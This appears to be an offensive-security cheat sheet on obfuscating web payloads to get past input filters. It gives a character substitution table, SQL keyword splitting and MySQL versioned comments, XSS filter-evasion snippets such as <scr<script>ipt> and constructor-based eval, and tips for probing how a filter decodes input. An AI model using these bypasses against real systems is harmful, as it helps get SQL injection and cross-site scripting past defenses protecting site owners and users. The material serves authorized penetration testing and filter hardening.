# Payload Obfuscation

Obfuscation buys one parse. It is not a substitute for a working payload — get the
payload working unobfuscated first, then obfuscate to pass the filter.

---

## Order of work

1. Working payload, unobfuscated, confirmed by observable.
2. Identify which character the filter rejects (bisect the payload).
3. Replace only that character, one rung at a time.
4. Re-confirm the observable after every replacement.

Bisect: send halves of the payload; the half that blocks contains the trigger.

---

## Character substitution table

| Char | Substitutes |
|---|---|
| space | `/**/` `%09` `%0a` `+` `${IFS}` `$IFS` `{a,b}` |
| `'` | `%27` `\'` `''` `CHAR(39)` `0x27` `’` |
| `"` | `%22` `\"` `"` `CHAR(34)` |
| `<` | `%3c` `\x3c` `&lt;` `＜` |
| `>` | `%3e` `\x3e` `&gt;` `＞` |
| `/` | `%2f` `\/` `%5c` `／` |
| `.` | `%2e` `[.]` `.` `。` |
| `=` | `%3d` `LIKE` `<>` |
| `(` `)` | `%28` `%29` `[` `]` |
| `--` | `#` `/* */` `;%00` |

---

## Keyword splitting

```
UNION SELECT   → UN/**/ION SEL/**/ECT
OR             → O/**/R   ||   |
AND            → A/**/ND  &&   &
SELECT         → SEL/**/ECT  /*!SELECT*/
<script>       → <scr<script>ipt>  (double-write for naive replace)
alert          → \u0061lert  top["al\u0065rt"]
```

MySQL versioned comments `/*!50000SELECT*/` execute and pass many filters.

---

## Case and concatenation

```
SeLeCt  sElEcT  SELECT
CONCAT(0x41,0x42)  'a'||'b'  'a'+'b'
```

---

## Encoding stacks

```
url → double-url → unicode → html-entity → hex
```

Apply only as deep as the decode count you measured. Over-encoding breaks the payload.

---

## JS-specific

```
alert(1)                    →  top['al'+'ert'](1)
String.fromCharCode(97,108,101,114,116)
[].constructor.constructor('alert(1)')()
eval(name)                  with ?name=alert(1)
location='javas'+'cript:alert(1)'
```

---

## Verification discipline

After each obfuscation step, re-check the **observable**, not the payload string. A
payload that looks right and returns the baseline is dead.

---

## Go deeper

1. Combine obfuscation with transport change (body instead of query).
2. Test whether the filter is applied before or after URL-decoding by sending `%20`
   vs a literal space.
3. Test whether the filter is recursive (`<scr<script>ipt>`).
4. Test whether the filter is length-limited — pad to the limit and see if the tail is cut.

---

## Related

- `02-web/401-to-200.md`
- `11-regex/20-bypass.md`
- `00-core/impact-proof.md`
